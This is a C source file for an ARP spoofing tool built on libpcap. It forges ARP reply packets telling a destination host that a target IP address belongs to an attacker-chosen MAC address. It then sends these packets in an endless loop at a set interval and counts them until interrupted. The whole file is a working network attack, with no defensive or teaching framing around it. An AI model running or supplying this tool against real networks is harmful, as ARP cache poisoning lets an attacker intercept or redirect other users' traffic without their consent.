#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <pcap/pcap.h>

#include "../utils/utils.h"
#include "../utils/netutils.h"

#define SLEEP_TIME (4 * 1000000)

void handle_int(int);
pcap_t *dev;
int sleep_time;
unsigned int sent_packets = 0;

int main(int argc, char *argv[]){
	if(argc == 5){//use default
		sleep_time = SLEEP_TIME;
	}else if(argc == 6){	
		if(sscanf(argv[5], "%d", &sleep_time) != 1)
			fatal("in scanf().");
		sleep_time *= 1000;
	}else{
		printf("Usage: %s <mac_dest> <ip_dest> <ip_target> <mac_redirect-to> <timeout_millis>\n\n", argv[0]);
		return 1;
	}
	unsigned char arp_packet[ETHER_LEN + ARP_LEN];
	char errbuf[PCAP_ERRBUF_SIZE];	

	unsigned char mac_dest[6], mac_redir[6];
	get_mac(argv[1], mac_dest);
	get_mac(argv[4], mac_redir);
	unsigned int ip_dest = calc_ip(argv[2]);
	unsigned int ip_target = calc_ip(argv[3]);

	char *dev_name = get_device(errbuf);
		
	if((dev = pcap_open_live(dev_name, 4096, 0, 0, errbuf)) == NULL)
		fatal("in pcap_open_live().");

	build_ether(arp_packet, mac_dest, mac_redir, ARP);
	build_arp(arp_packet + ETHER_LEN, ARP_REPLY, mac_redir, ip_target, mac_dest, ip_dest);

	printf("Spoofing ARP replies to %s --- %s is at %s\n", argv[2], argv[3], argv[4]);
	fflush(stdout);	
	signal(SIGINT, handle_int);	
	while(1){
		if(pcap_sendpacket(dev, arp_packet, ETHER_LEN + ARP_LEN) == -1)
			fatal("in pcap_send_packet().");			
	 
		usleep(sleep_time);
		sent_packets++;
		if(sent_packets % 10 == 0)
			printf("Packets sent: %d\n", sent_packets);
	}	
}
void handle_int(int sig){
	printf("\nTotal packets sent: %d\n", sent_packets);	
	printf("\nProgram recieved interrupt signal...terminating...\n");
	pcap_close(dev);
	exit(0);
}
